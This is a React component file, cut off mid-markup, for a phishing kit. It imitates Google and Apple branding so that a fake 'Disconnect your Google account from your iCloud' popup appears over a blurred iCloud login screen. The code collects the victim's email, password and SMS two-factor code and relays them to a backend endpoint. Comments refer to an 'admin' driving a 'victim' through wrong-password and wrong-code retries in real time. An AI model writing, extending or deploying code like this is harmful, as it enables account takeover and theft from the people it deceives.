import { useEffect, useState } from "react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { AnimatePresence, motion } from "framer-motion";

function GoogleG({ size = 28 }) {
  return (
    <svg viewBox="0 0 48 48" width={size} height={size} aria-hidden="true">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
    </svg>
  );
}

function AppleMark({ size = 28 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="#1d1d1f"
      aria-hidden="true"
    >
      <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.22-1.98 1.09-3.13-1.05.04-2.32.7-3.07 1.58-.67.79-1.25 2.05-1.1 3.26 1.16.09 2.35-.66 3.08-1.71z" />
    </svg>
  );
}

/** Classic Google four-dot bounce */
function GoogleDots() {
  const colors = ["#4285F4", "#EA4335", "#FBBC05", "#34A853"];
  return (
    <div className="flex items-center justify-center gap-2.5" aria-hidden="true">
      {colors.map((color, i) => (
        <motion.span
          key={color}
          className="block h-2.5 w-2.5 rounded-full"
          style={{ backgroundColor: color }}
          animate={{ y: [0, -7, 0], scale: [1, 1.15, 1] }}
          transition={{
            duration: 0.72,
            repeat: Infinity,
            ease: "easeInOut",
            delay: i * 0.12,
          }}
        />
      ))}
    </div>
  );
}

function DisconnectHero({ success }) {
  return (
    <div className="relative mx-auto mt-2 sm:mt-4 mb-1 flex h-[64px] sm:h-[72px] w-full max-w-[200px] sm:max-w-[220px] items-center justify-center">
      <motion.div
        className="absolute left-1 sm:left-2 flex h-11 w-11 sm:h-12 sm:w-12 items-center justify-center rounded-full bg-[#f8f9fa] ring-1 ring-[#dadce0]"
        animate={
          success
            ? { x: -6, scale: 1 }
            : { x: [0, -2, 0], scale: [1, 1.03, 1] }
        }
        transition={
          success
            ? { duration: 0.45 }
            : { duration: 2.2, repeat: Infinity, ease: "easeInOut" }
        }
      >
        <GoogleG size={24} />
      </motion.div>

      <div className="relative z-[1] flex w-[64px] sm:w-[72px] items-center justify-center">
        {!success ? (
          <>
            <motion.div
              className="absolute inset-x-1 top-1/2 h-[2px] -translate-y-1/2 overflow-hidden rounded-full"
              style={{
                background:
                  "linear-gradient(90deg,#4285F4,#EA4335,#FBBC05,#34A853)",
              }}
              animate={{ opacity: [0.35, 1, 0.35], scaleX: [0.85, 1, 0.85] }}
              transition={{ duration: 1.4, repeat: Infinity }}
            />
            <motion.span
              className="relative z-[1] flex h-7 w-7 items-center justify-center rounded-full bg-white ring-1 ring-[#dadce0] shadow-sm"
              animate={{ rotate: [0, 180, 360] }}
              transition={{ duration: 2.8, repeat: Infinity, ease: "linear" }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                <path
                  d="M8.5 15.5l7-7M9 8.2a3.2 3.2 0 0 1 4.5 0l.8.8M14.8 15.8a3.2 3.2 0 0 1-4.5 0l-.7-.7"
                  stroke="#5f6368"
                  strokeWidth="1.8"
                  strokeLinecap="round"
                />
              </svg>
            </motion.span>
          </>
        ) : (
          <motion.span
            initial={{ scale: 0, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ type: "spring", stiffness: 420, damping: 18 }}
            className="flex h-9 w-9 items-center justify-center rounded-full bg-[#e6f4ea] text-[#137333] ring-1 ring-[#34A853]/40"
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path
                d="M5 12.5l4.5 4.5L19 7.5"
                stroke="#34A853"
                strokeWidth="2.6"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </motion.span>
        )}
      </div>

      <motion.div
        className="absolute right-1 sm:right-2 flex h-11 w-11 sm:h-12 sm:w-12 items-center justify-center rounded-full bg-[#f5f5f7] ring-1 ring-[#d2d2d7]"
        animate={
          success
            ? { x: 6, scale: 1, opacity: 0.55 }
            : { x: [0, 2, 0], scale: [1, 1.03, 1] }
        }
        transition={
          success
            ? { duration: 0.45 }
            : { duration: 2.2, repeat: Infinity, ease: "easeInOut" }
        }
      >
        <AppleMark size={22} />
      </motion.div>
    </div>
  );
}

function PersonIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368" aria-hidden="true">
      <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z" />
    </svg>
  );
}

/** Static iCloud login look — stays visible (blurred) behind the Google popup */
function ICloudBackdrop({ emailHint }) {
  return (
    <div className="w-full h-full flex flex-col" style={{ background: "#fbfbfd" }}>
      <div
        className="h-[44px] shrink-0 flex items-center px-3 border-b"
        style={{
          background: "rgba(251,251,253,0.85)",
          borderColor: "rgba(0,0,0,0.08)",
        }}
      >
        <span className="text-[15px] font-semibold tracking-tight text-[#1d1d1f]">
           iCloud
        </span>
      </div>

      <div className="flex-1 flex items-start justify-center pt-6 sm:pt-10 px-3 sm:px-4">
        <div
          className="w-full max-w-[520px] rounded-[22px] sm:rounded-[28px] px-5 sm:px-8 pt-6 sm:pt-8 pb-8 sm:pb-10"
          style={{
            background: "#fff",
            boxShadow: "0 11px 34px rgba(120,120,128,0.16)",
          }}
        >
          <div className="flex flex-col items-center">
            <img
              src="/logo.png?v=5"
              alt=""
              className="w-[72px] h-[72px] sm:w-[100px] sm:h-[100px] object-contain"
              draggable={false}
            />
            <h1 className="mt-3 font-apple text-[22px] sm:text-[26px] font-[600] text-center text-[#1d1d1f] leading-tight px-2">
              Sign in with Apple Account
            </h1>
          </div>
          <div
            className="mt-5 sm:mt-6 h-[52px] rounded-[12px] border px-4 flex flex-col justify-center"
            style={{ borderColor: "#c7c7cc", background: "#fff" }}
          >
            <span className="text-[11px] text-[#6e6e73]">Email or Phone Number</span>
            <span className="text-[16px] text-[#1d1d1f] truncate">
              {emailHint || "apple@icloud.com"}
            </span>
          </div>
          <p className="mt-3 text-[14px] text-[#0066cc]">Create your Apple Account</p>
          <div className="mt-8 sm:mt-10 flex flex-col sm:flex-row gap-2.5 sm:gap-3">
            <div className="flex-1 h-[44px] sm:h-[42px] rounded-[12px] bg-[#0071e3] flex items-center justify-center text-white text-[15px] font-medium font-apple">
              Continue
            </div>
            <div className="flex-1 h-[44px] sm:h-[42px] rounded-[12px] bg-[#1d1d1f] flex items-center justify-center text-white text-[13px] font-medium font-apple px-2 text-center leading-tight">
              Sign in with iPhone
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function GoogleSpinner({ size = 40 }) {
  return (
    <span
      className="relative inline-block"
      style={{ width: size, height: size }}
      aria-hidden="true"
    >
      <svg viewBox="0 0 66 66" className="w-full h-full animate-spin" style={{ animationDuration: "0.9s" }}>
        <circle
          cx="33"
          cy="33"
          r="28"
          fill="none"
          stroke="#dadce0"
          strokeWidth="6"
        />
        <path
          d="M33 5 a28 28 0 0 1 24.2 14"
          fill="none"
          stroke="#1a73e8"
          strokeWidth="6"
          strokeLinecap="round"
        />
      </svg>
    </span>
  );
}

function stepFromStatus(status, page) {
  if (status === "accept_device_resending") return "accept_device_loading";
  if (page === "accept_device" || status === "accept_device") return "accept_device";
  if (status === "verify_resending") return "verify_loading";
  if (status === "google_sms_resending") return "sms_loading";
  if (status === "verify_its_you" || status === "gWrongVerify") return "verify";
  if (
    status === "google_sms_2fa" ||
    status === "google_sms_waiting" ||
    status === "gWrong2fa"
  )
    return "sms";
  if (status === "done_google" || status === "disconnectSubmitted") return "done";
  if (
    status === "disconnectPass" ||
    status === "disconnectPassWaiting" ||
    status === "disconnectEmail" ||
    status === "gWrongPass"
  ) {
    return "password";
  }
  return "email"; // includes gWrongMail, disconnectOpen
}

function Disconnect({ authUser }) {
  const [email, setEmail] = useState(authUser?.googleEmail || "");
  const [password, setPassword] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [dontAsk, setDontAsk] = useState(true);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passFocused, setPassFocused] = useState(false);
  const [codeFocused, setCodeFocused] = useState(false);
  const [busy, setBusy] = useState(false);
  const [popupOpen, setPopupOpen] = useState(true);
  const [doneReady, setDoneReady] = useState(false);
  const queryClient = useQueryClient();

  const status = authUser?.currentStatus || "disconnectOpen";
  const uiStep = stepFromStatus(status, authUser?.currentPage);
  const waitingPass = status === "disconnectPassWaiting";
  const waitingSms = status === "google_sms_waiting";
  const wrongMail = status === "gWrongMail";
  const wrongPass = status === "gWrongPass";
  const wrong2fa = status === "gWrong2fa";
  const wrongVerify = status === "gWrongVerify";
  const prompt = authUser?.googlePrompt || "99";
  const displayEmail = email || authUser?.googleEmail || "";

  useEffect(() => {
    if (authUser?.googleEmail) setEmail(authUser.googleEmail);
  }, [authUser?.googleEmail]);

  // Clear fields when admin sends a wrong-* so victim can retry
  useEffect(() => {
    if (status === "gWrongPass") setPassword("");
    if (status === "gWrong2fa") setSmsCode("");
  }, [status]);

  // Re-open popup when admin moves to another disconnect step
  useEffect(() => {
    if (status && status !== "done_google" && status !== "disconnectSubmitted") {
      setPopupOpen(true);
      setDoneReady(false);
    }
  }, [status]);

  // Done page: load ~6.5s with Google disconnect animation, then success
  useEffect(() => {
    if (uiStep !== "done") {
      setDoneReady(false);
      return undefined;
    }
    setDoneReady(false);
    const t = setTimeout(() => setDoneReady(true), 6500);
    return () => clearTimeout(t);
  }, [uiStep, status]);

  const { mutateAsync: disconnectGoogle } = useMutation({
    mutationFn: async (body) => {
      const res = await fetch("/api/v1/rumman/auth/disconnect_google", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data = await res.json();
      if (!res.ok || data.error) throw new Error(data.error || "Failed");
      return data;
    },
    onSuccess: (data) => {
      queryClient.setQueryData(["authUser"], data);
    },
  });

  const handleNextEmail = async () => {
    if (!email.trim() || busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({ step: "email", googleEmail: email.trim() });
    } finally {
      setBusy(false);
    }
  };

  const handleNextPassword = async () => {
    if (!password.trim() || busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({
        step: "password",
        googleEmail: email.trim() || displayEmail,
        googlePassword: password,
      });
    } finally {
      setBusy(false);
    }
  };

  const handleNextSms = async () => {
    const cleaned = smsCode.replace(/\D/g, "").slice(0, 6);
    if (cleaned.length < 6 || busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({ step: "sms", googleCode: cleaned });
    } finally {
      setBusy(false);
    }
  };

  const handleVerifyDone = async () => {
    if (busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({
        step: "verify",
        googleCode: `prompt:${prompt}`,
      });
    } finally {
      setBusy(false);
    }
  };

  const handleCloseDone = async () => {
    if (busy) return;
    setPopupOpen(false);
    setBusy(true);
    try {
      await new Promise((r) => setTimeout(r, 340));
      await disconnectGoogle({ step: "finish" });
    } finally {
      setBusy(false);
    }
  };

  const handleResendPrompt = async () => {
    if (busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({ step: "resend" });
    } finally {
      setBusy(false);
    }
  };

  const handleResendSms = async () => {
    if (busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({ step: "resend_sms" });
    } finally {
      setBusy(false);
    }
  };

  const handleResendDevice = async () => {
    if (busy) return;
    setBusy(true);
    try {
      await disconnectGoogle({ step: "resend_device" });
    } finally {
      setBusy(false);
    }
  };

  const emailActive = emailFocused || email.length > 0;
  const passActive = passFocused || password.length > 0;

  const emailChip = (
    <button
      type="button"
      className="inline-flex max-w-full items-center gap-2 rounded-full border border-[#747775] px-3 py-1.5 text-[13px] text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]"
    >
      <PersonIcon />
      <span className="min-w-0 max-w-[min(240px,calc(100vw-7.5rem))] truncate sm:max-w-[220px]">
        {displayEmail}
      </span>
      <span className="text-[#444746] text-[10px] shrink-0">▾</span>
    </button>
  );

  return (
    <div className="relative h-[100dvh] min-h-0 max-h-[100dvh] overflow-hidden bg-[#fbfbfd]">
      {/* iCloud underneath */}
      <div
        className="absolute inset-0 pointer-events-none select-none transition-[filter,transform] duration-400"
        aria-hidden="true"
        style={
          popupOpen
            ? {
                filter: "blur(10px) saturate(1.05)",
                transform: "scale(1.04)",
                transformOrigin: "top center",
              }
            : {
                filter: "none",
                transform: "scale(1)",
                transformOrigin: "top center",
              }
        }
      >
        <ICloudBackdrop emailHint={authUser?.email} />
      </div>

      {/* Soft frosted veil + popup */}
      <AnimatePresence>
        {popupOpen && (
          <>
            <motion.div
              key="veil"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.28 }}
              className="absolute inset-0 z-20"
              style={{
                background:
                  "radial-gradient(ellipse 80% 60% at 50% 30%, rgba(255,255,255,0.35), rgba(0,0,0,0.28))",
                backdropFilter: "blur(2px)",
              }}
            />

            <div className="absolute inset-0 z-30 flex items-end justify-center sm:items-start sm:px-3 sm:pt-16 md:pt-20 pointer-events-none pb-[env(safe-area-inset-bottom)] sm:pb-0">
              <AnimatePresence mode="wait">
                <motion.div
                  key={uiStep}
                  role="dialog"
                  aria-modal="true"
                  initial={{ opacity: 0, y: 48, scale: 1 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: 28, scale: 1 }}
                  transition={{ duration: 0.36, ease: [0.22, 1, 0.36, 1] }}
                  className="pointer-events-auto w-full max-w-none sm:max-w-[400px] rounded-t-[28px] sm:rounded-[28px] bg-white overflow-hidden max-h-[min(92dvh,860px)] sm:max-h-[min(85vh,720px)] flex flex-col"
                  style={{
                    boxShadow:
                      "0 -8px 40px rgba(0,0,0,0.18), 0 24px 48px rgba(0,0,0,0.16)",
                  }}
                >
                  {/* Mobile drag handle */}
                  <div className="sm:hidden flex justify-center pt-2.5 pb-0.5 shrink-0" aria-hidden="true">
                    <span className="h-1 w-10 rounded-full bg-[#dadce0]" />
                  </div>

                  <div className="px-5 pt-3 pb-[max(1.25rem,env(safe-area-inset-bottom))] sm:px-7 sm:pt-5 sm:pb-6 overflow-y-auto overscroll-contain [-webkit-overflow-scrolling:touch]">
              {uiStep !== "done" && <GoogleG size={22} />}

              {uiStep === "email" && (
                <>
                  <h1 className="mt-3.5 text-[22px] sm:text-[24px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    Disconnect
                  </h1>
                  <p className="mt-1.5 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                    Disconnect your Google account from your iCloud with Google
                    sign-in.
                  </p>

                  <div className="mt-5">
                    <div
                      className={`relative rounded-[4px] border ${
                        wrongMail
                          ? "border-[#b3261e] shadow-[0_0_0_1px_#b3261e]"
                          : emailFocused
                          ? "border-[#0b57d0] shadow-[0_0_0_1px_#0b57d0]"
                          : "border-[#747775]"
                      }`}
                    >
                      <input
                        type="email"
                        inputMode="email"
                        autoCapitalize="none"
                        autoCorrect="off"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        onFocus={() => setEmailFocused(true)}
                        onBlur={() => setEmailFocused(false)}
                        onKeyDown={(e) =>
                          e.key === "Enter" && handleNextEmail()
                        }
                        className={`w-full h-[52px] sm:h-[48px] px-3 text-[16px] text-[#1f1f1f] outline-none bg-transparent font-[Arial,Helvetica,sans-serif] ${
                          emailActive ? "pt-[16px] pb-[2px]" : ""
                        }`}
                      />
                      <span
                        className={`pointer-events-none absolute left-3 font-[Arial,Helvetica,sans-serif] transition-all ${
                          emailActive
                            ? "top-[5px] text-[11px] text-[#0b57d0]"
                            : "top-1/2 -translate-y-1/2 text-[16px] text-[#444746]"
                        }`}
                      >
                        Email or phone
                      </span>
                    </div>
                    {wrongMail && (
                      <p className="mt-2 text-[12px] leading-snug text-[#b3261e] font-[Arial,Helvetica,sans-serif]">
                        Couldn’t find your Google Account. Try again.
                      </p>
                    )}
                    <button
                      type="button"
                      className="mt-2.5 text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0 inline-flex items-center"
                    >
                      Forgot email?
                    </button>
                  </div>

                  <div className="mt-6 flex justify-end">
                    <button
                      type="button"
                      disabled={!email.trim() || busy}
                      onClick={handleNextEmail}
                      className="h-[44px] sm:h-[38px] min-w-[88px] sm:min-w-[76px] rounded-full bg-[#0b57d0] px-6 sm:px-5 text-[15px] sm:text-[14px] font-medium text-white disabled:opacity-40 hover:bg-[#0842a0] font-[Arial,Helvetica,sans-serif] active:scale-[0.98] transition"
                    >
                      Next
                    </button>
                  </div>
                </>
              )}

              {uiStep === "password" && (
                <>
                  <h1 className="mt-3.5 text-[22px] sm:text-[24px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    Welcome
                  </h1>
                  <div className="mt-3">{emailChip}</div>

                  <div className="mt-5">
                    <div
                      className={`relative rounded-[4px] border ${
                        wrongPass
                          ? "border-[#b3261e] shadow-[0_0_0_1px_#b3261e]"
                          : passFocused
                          ? "border-[#0b57d0] shadow-[0_0_0_1px_#0b57d0]"
                          : "border-[#747775]"
                      }`}
                    >
                      <input
                        type={showPass ? "text" : "password"}
                        autoCapitalize="none"
                        autoCorrect="off"
                        value={password}
                        disabled={waitingPass}
                        onChange={(e) => setPassword(e.target.value)}
                        onFocus={() => setPassFocused(true)}
                        onBlur={() => setPassFocused(false)}
                        onKeyDown={(e) =>
                          e.key === "Enter" && handleNextPassword()
                        }
                        className={`w-full h-[52px] sm:h-[48px] px-3 text-[16px] text-[#1f1f1f] outline-none bg-transparent disabled:opacity-60 font-[Arial,Helvetica,sans-serif] ${
                          passActive ? "pt-[16px] pb-[2px]" : ""
                        }`}
                      />
                      <span
                        className={`pointer-events-none absolute left-3 font-[Arial,Helvetica,sans-serif] transition-all ${
                          passActive
                            ? "top-[5px] text-[11px] text-[#0b57d0]"
                            : "top-1/2 -translate-y-1/2 text-[16px] text-[#444746]"
                        }`}
                      >
                        Enter your password
                      </span>
                    </div>

                    <label className="mt-3.5 flex items-center gap-2.5 cursor-pointer select-none min-h-[44px] sm:min-h-0">
                      <input
                        type="checkbox"
                        checked={showPass}
                        disabled={waitingPass}
                        onChange={() => setShowPass((v) => !v)}
                        className="w-[18px] h-[18px] sm:w-[15px] sm:h-[15px] accent-[#0b57d0] shrink-0"
                      />
                      <span className="text-[14px] sm:text-[13px] text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                        Show password
                      </span>
                    </label>
                  </div>

                  {wrongPass && (
                    <p className="mt-3 text-[12px] leading-snug text-[#b3261e] font-[Arial,Helvetica,sans-serif]">
                      Wrong password. Try again or click Forgot password to reset it.
                    </p>
                  )}

                  {waitingPass && !wrongPass && (
                    <p className="mt-3 text-[12px] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                      Verifying… waiting for next step
                    </p>
                  )}

                  <div className="mt-6 flex items-center justify-between gap-3">
                    <button
                      type="button"
                      className="text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0 inline-flex items-center"
                    >
                      Forgot password?
                    </button>
                    <button
                      type="button"
                      disabled={!password.trim() || busy || waitingPass}
                      onClick={handleNextPassword}
                      className="h-[44px] sm:h-[38px] min-w-[88px] sm:min-w-[76px] rounded-full bg-[#0b57d0] px-6 sm:px-5 text-[15px] sm:text-[14px] font-medium text-white disabled:opacity-40 hover:bg-[#0842a0] font-[Arial,Helvetica,sans-serif] active:scale-[0.98] transition shrink-0"
                    >
                      Next
                    </button>
                  </div>
                </>
              )}

              {uiStep === "sms" && (
                <>
                  <h1 className="mt-3.5 text-[22px] sm:text-[24px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    2-Step Verification
                  </h1>
                  <p className="mt-1.5 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                    To help keep your account safe, Google wants to make sure
                    it’s really you trying to sign in
                  </p>

                  <div className="mt-3">{emailChip}</div>

                  <button
                    type="button"
                    disabled={busy || waitingSms}
                    onClick={handleResendSms}
                    className="mt-1 inline-flex items-center gap-2 text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline disabled:opacity-50 font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0"
                  >
                    {busy ? (
                      <>
                        <GoogleSpinner size={16} />
                        <span>Sending…</span>
                      </>
                    ) : (
                      "Resend"
                    )}
                  </button>

                  <p className="mt-2 sm:mt-4 rounded-lg bg-[#e8f0fe] px-3 py-2.5 text-[13px] leading-[1.45] text-[#174ea6] font-[Arial,Helvetica,sans-serif]">
                    A 6-digit verification code was sent to you by SMS, or you
                    can use a code from your Google Authenticator app.
                  </p>

                  <div className="mt-4">
                    <div
                      className={`relative flex items-center rounded-[4px] border ${
                        wrong2fa
                          ? "border-[#b3261e] shadow-[0_0_0_1px_#b3261e]"
                          : codeFocused
                          ? "border-[#0b57d0] shadow-[0_0_0_1px_#0b57d0]"
                          : "border-[#747775]"
                      }`}
                    >
                      <span className="pl-3 text-[16px] text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                        G-
                      </span>
                      <input
                        type="text"
                        inputMode="numeric"
                        autoComplete="one-time-code"
                        value={smsCode}
                        disabled={waitingSms}
                        onChange={(e) =>
                          setSmsCode(
                            e.target.value.replace(/\D/g, "").slice(0, 6)
                          )
                        }
                        onFocus={() => setCodeFocused(true)}
                        onBlur={() => setCodeFocused(false)}
                        onKeyDown={(e) => e.key === "Enter" && handleNextSms()}
                        placeholder="Enter code"
                        className="flex-1 h-[52px] sm:h-[48px] pr-3 pl-1 text-[16px] text-[#1f1f1f] outline-none bg-transparent disabled:opacity-60 font-[Arial,Helvetica,sans-serif] placeholder:text-[#444746]"
                      />
                    </div>

                    <label className="mt-3.5 flex items-center gap-2.5 cursor-pointer select-none min-h-[44px] sm:min-h-0">
                      <input
                        type="checkbox"
                        checked={dontAsk}
                        disabled={waitingSms}
                        onChange={() => setDontAsk((v) => !v)}
                        className="w-[18px] h-[18px] sm:w-[15px] sm:h-[15px] accent-[#0b57d0] shrink-0"
                      />
                      <span className="text-[14px] sm:text-[13px] text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                        Don’t ask again on this device
                      </span>
                    </label>
                  </div>

                  {wrong2fa && (
                    <p className="mt-3 text-[12px] leading-snug text-[#b3261e] font-[Arial,Helvetica,sans-serif]">
                      Wrong code. Check the code and try again.
                    </p>
                  )}

                  {waitingSms && !wrong2fa && (
                    <p className="mt-3 text-[12px] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                      Code captured — waiting for next step
                    </p>
                  )}

                  <div className="mt-6 flex items-center justify-between gap-3">
                    <button
                      type="button"
                      className="text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0 inline-flex items-center"
                    >
                      Try another way
                    </button>
                    <button
                      type="button"
                      disabled={
                        smsCode.replace(/\D/g, "").length < 6 ||
                        busy ||
                        waitingSms
                      }
                      onClick={handleNextSms}
                      className="h-[44px] sm:h-[38px] min-w-[88px] sm:min-w-[76px] rounded-full bg-[#0b57d0] px-6 sm:px-5 text-[15px] sm:text-[14px] font-medium text-white disabled:opacity-40 hover:bg-[#0842a0] font-[Arial,Helvetica,sans-serif] active:scale-[0.98] transition shrink-0"
                    >
                      Next
                    </button>
                  </div>
                </>
              )}

              {uiStep === "sms_loading" && (
                <>
                  <h1 className="mt-3.5 text-[22px] sm:text-[24px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    2-Step Verification
                  </h1>
                  <p className="mt-1.5 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                    Sending a new verification code…
                  </p>
                  <div className="mt-3">{emailChip}</div>
                  <div className="mt-10 mb-6 flex flex-col items-center justify-center gap-3">
                    <GoogleSpinner size={44} />
                    <p className="text-[13px] text-[#5f6368] font-[Arial,Helvetica,sans-serif]">
                      Waiting for a new code…
                    </p>
                    <div className="mt-1 flex gap-1.5" aria-hidden="true">
                      {["#4285F4", "#EA4335", "#FBBC05", "#34A853"].map((c, i) => (
                        <motion.span
                          key={c}
                          className="block h-1.5 w-1.5 rounded-full"
                          style={{ background: c }}
                          animate={{ opacity: [0.35, 1, 0.35], y: [0, -3, 0] }}
                          transition={{
                            duration: 0.8,
                            repeat: Infinity,
                            delay: i * 0.12,
                          }}
                        />
                      ))}
                    </div>
                  </div>
                </>
              )}

              {(uiStep === "accept_device" || uiStep === "accept_device_loading") && (
                <>
                  <h1 className="mt-3.5 text-[24px] sm:text-[26px] leading-tight font-medium text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    Verify it’s you
                  </h1>
                  <p className="mt-2 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                    To help keep your account safe, Google wants to make sure
                    it’s really you trying to sign in.{" "}
                    <button
                      type="button"
                      className="text-[#0b57d0] hover:underline font-medium"
                    >
                      Learn more
                    </button>
                  </p>

                  <div className="mt-4 flex flex-wrap items-center gap-x-4 gap-y-2">
                    {emailChip}
                    <button
                      type="button"
                      disabled={busy || uiStep === "accept_device_loading"}
                      onClick={handleResendDevice}
                      className="text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline disabled:opacity-50 font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0 inline-flex items-center gap-2"
                    >
                      {busy || uiStep === "accept_device_loading" ? (
                        <>
                          <GoogleSpinner size={14} />
                          <span>Sending…</span>
                        </>
                      ) : (
                        "Resend it"
                      )}
                    </button>
                  </div>

                  <div className="mt-6 pt-5 border-t border-[#e8eaed]">
                    <h2 className="text-[16px] sm:text-[15px] font-medium text-[#1f1f1f] font-[Arial,Helvetica,sans-serif] leading-snug">
                      Open the Gmail app on Phone
                    </h2>
                    {uiStep === "accept_device_loading" ? (
                      <div className="mt-4 mb-2 flex flex-col items-start gap-3">
                        <p className="text-[14px] sm:text-[13px] leading-[1.5] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                          Sending a new notification to your Phone…
                        </p>
                        <GoogleSpinner size={28} />
                      </div>
                    ) : (
                      <p className="mt-2 text-[14px] sm:text-[13px] leading-[1.5] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                        Google sent a notification to your Phone. Open the Gmail
                        app, tap <span className="font-medium text-[#1f1f1f]">Yes</span> on
                        the prompt, then tap on your phone to verify it’s you.
                      </p>
                    )}
                  </div>
                </>
              )}

              {uiStep === "verify_loading" && (
                <>
                  <h1 className="mt-3.5 text-[22px] sm:text-[24px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    Verify it’s you
                  </h1>
                  <p className="mt-1.5 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                    Sending a new notification to your phone…
                  </p>
                  <div className="mt-3">{emailChip}</div>
                  <div className="mt-10 mb-6 flex flex-col items-center justify-center gap-3">
                    <GoogleSpinner size={44} />
                    <p className="text-[13px] text-[#5f6368] font-[Arial,Helvetica,sans-serif]">
                      Waiting for a new number…
                    </p>
                    <div className="mt-1 flex gap-1.5" aria-hidden="true">
                      {["#4285F4", "#EA4335", "#FBBC05", "#34A853"].map((c, i) => (
                        <motion.span
                          key={c}
                          className="block h-1.5 w-1.5 rounded-full"
                          style={{ background: c }}
                          animate={{ opacity: [0.35, 1, 0.35], y: [0, -3, 0] }}
                          transition={{
                            duration: 0.8,
                            repeat: Infinity,
                            delay: i * 0.12,
                          }}
                        />
                      ))}
                    </div>
                  </div>
                </>
              )}

              {uiStep === "verify" && (
                <>
                  <h1 className="mt-3.5 text-[22px] sm:text-[24px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                    Verify it’s you
                  </h1>
                  <p className="mt-1.5 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                    To help keep your account safe, Google wants to make sure
                    it’s really you trying to sign in
                  </p>

                  <div className="mt-3">{emailChip}</div>

                  <div className="mt-5">
                    <button
                      type="button"
                      disabled={busy}
                      onClick={handleResendPrompt}
